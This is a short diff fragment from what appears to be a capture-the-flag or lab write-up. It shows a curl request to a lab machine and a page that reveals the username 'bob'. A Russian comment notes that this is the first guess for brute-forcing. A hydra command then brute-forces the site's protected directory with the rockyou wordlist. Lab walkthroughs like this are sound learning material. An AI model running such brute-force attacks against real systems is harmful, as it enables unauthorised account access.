@@ -37,6 +37,7 @@ curl http://10.129.187.90/guidelines/
 Hey <b>bob</b>, did you update that TomCat server?
 
 ```
+а в нем есть первое предпологаемое имя для брутфорса, использую его для входа на сайт 
 ```
 hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.129.187.90 -s 80 http-get /protected/
 
